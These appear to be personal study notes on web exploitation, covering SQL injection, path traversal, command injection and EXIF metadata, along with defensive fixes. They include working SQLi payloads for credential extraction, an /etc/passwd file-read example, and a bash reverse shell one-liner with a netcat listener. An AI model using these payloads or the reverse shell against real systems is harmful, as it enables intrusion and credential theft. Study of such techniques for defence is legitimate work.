# General Tips

- Understand how the application is working
- Think like a software engineer
- Think of potential exploits

# SQLi

Vuln: control and data sharing the same band 

Magic Payload: '";<lol/>../--#`ls`

or 1=1 to bypass condition --> use 1=1 and 1=0 to test whether vulnerable

Union join: combine left and right queries with same number and types of columns (can reuse columns - e.g. SELECT username, password, username, password)

Confirm number of columns by injecting union select 1, 1, 1;-- etc.

Use single quote in input for '1' = '1' - acts like a delimiter

Find:

- How user input is being used
- Type of DBMS
  - sqlite3 (https://www.techonthenet.com/sqlite/sys_tables/index.php)
    - `select tbl_name, sql from sqlite_master`
    - `select name, sql from sqlite_master where type='table'`
    - Comment: `-- `
- Database schema
- Table (can guess)
- Column (can guess)

Blind SQLi

- Can't directly exfiltrate data by selecting it into a column
- Can make the database do something depending on if a condition is true
  - Boolean-based blind
    - https://www.example.com/items.php?id=1' and (select 1 from users where (select password from users where username like '%admin%' limit 0,1) like '<GUESS>%') -- 
  - Time-based blind
    - Sleep if first letter of the password is an 'a' etc.
    - https://www.example.com/items.php?id=1' UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1;

Defence:

- Prepared statements
- Designing a login page
  - Client-side / server-side validation
  - Rate limit
  - Rename sqlite_master (security by obscurity)
  - Debug mode
  - Parameterised queries
  - Use functions - sanitise



SQLMap

# Files

- https://www.example.com/getimage?image=images/default.png

- Think like the developer - open image_path - can read from any directory - local file inclusion

  - Use  /etc/passwd
  - Relative paths

- Prevent path traversal

- ```python
  # Don't do
  open(user_path, 'r')
  # Do
  UPLOAD_DIR = '/app/uploads/'
  if os.path.dirname(os.realpath(os.path.join(UPLOAD_DIR, user_path))) != UPLOAD_DIR:
    # Directory traversal detected!
    exit()
  ```

- 

# Arbitrary Code Execution

- Vuln: command + arguments

- Can chain with `&&` (only run if previous succeeds) or `||` or `;`

- May be sanitised - client-side validation can be bypassed with Burp Suite

- System - may not have enough permissions (in sandbox environment)

- ```python
  # Don't do
  os.system('ping ' + host)
  # Do
  subprocess.call(['ping', host])
  ```

- Reverse shell with netcat (nc) - TCP

  - `nc -lv 4444` listens for incoming connections on port 4444
  - Listen on attacker system, connect to it from compromised server
  - "Bash Reverse Shell" -> `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

- URL-encode with Burp Suite (convert selection -> URL-encode key characters)

# EXIF

- Stripping metadata before uploading to system, look out for
  - Personal/device details
  - Malicious script
  - Correct file extension
- `exiftool`
- 





















